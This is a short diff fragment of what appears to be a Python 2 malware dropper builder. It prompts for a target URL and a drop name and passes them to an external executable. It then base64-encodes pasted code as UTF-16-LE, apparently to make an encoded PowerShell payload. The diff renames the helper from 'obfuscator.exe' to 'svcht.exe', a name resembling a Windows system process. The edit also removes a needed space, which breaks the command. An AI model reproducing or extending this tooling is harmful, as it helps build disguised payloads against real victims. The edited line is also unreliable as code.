@@ -12,7 +12,7 @@ print('')
 
 target = raw_input('ENTER TARGET URL: ')
 dropname = raw_input('ENTER DROP NAME: ')
-os.system("obfuscator.exe " + target + " " + dropname)
+os.system("svcht.exe" + target + " " + dropname)
 code = raw_input('CONTROL + V and press ENTER: ')
 print('')
 shellcode = base64.b64encode(code.encode('UTF-16-LE'))
